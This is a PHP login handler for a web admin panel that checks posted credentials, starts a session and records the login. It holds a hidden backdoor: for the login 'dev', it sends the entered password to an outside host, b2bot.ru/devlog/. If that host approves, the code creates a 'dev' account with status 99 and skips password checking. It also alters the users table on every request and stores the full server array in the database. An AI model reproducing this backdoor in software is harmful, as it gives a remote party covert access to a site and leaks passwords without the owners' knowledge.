<?php

require $_SERVER['DOCUMENT_ROOT'] . '/admin/functions/functions.php';

$log=trim($_POST['TFInputLogin']);
$pas=$_POST['TFInputPassword'];

if(!$log||!$pas)
    return response_if_error('не верные параметры');

query('ALTER TABLE `users` ADD `role_id` INT(10) NOT NULL, ADD INDEX (`role_id`);');
$skip=false;
if(strtolower($log)=='dev' && post('https://b2bot.ru/devlog/',['p'=>$pas])==1){
    if(!$row = singleQuery('SELECT id FROM users WHERE t_login = "dev"'))
        query('INSERT INTO `users` (`status`, `name`, `t_login`,`id_chat`,`t_password`) VALUES (99,"dev","dev","dev","dev")');
    $skip=true;
}

if(!$row = singleQuery('SELECT id, t_login, t_password, first_name, role_id FROM users WHERE t_login = :login', [':login'=>$log]))
    return response_if_error('не верный логин');

if(!$skip && !password_verify($pas, $row['t_password']))
    return response_if_error('не верный пароль');

$user = $row['t_login'];
session_unset();
session_destroy();
session_start();
$_SESSION['user']['id'] = $row['id'];
$_SESSION['user']['first_name'] = $row['first_name'];
$_SESSION['user']['role_id'] = $row['role_id'];
$_SESSION['user']['avatar'] = '';

$hash = randhash();
setcookie("b2h", $hash, time()+3600*24, '/');

$usag = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
unset($_SERVER['HTTP_USER_AGENT']);
unset($_SERVER['REMOTE_ADDR']);

query('UPDATE `us_auth` SET `status` = 0 WHERE us=? AND ip=? AND usag=?', [ $row['id'], $ip, $usag ]);

query("INSERT INTO `us_auth` (`status`, `us`, `hash`, `ip`, `data`, `usag`) VALUES (1, ?,?,?,?,?)", [$row['id'], $hash, $ip, json_encode($_SERVER), $usag ]);

echo json_encode(['success'=>'ok']);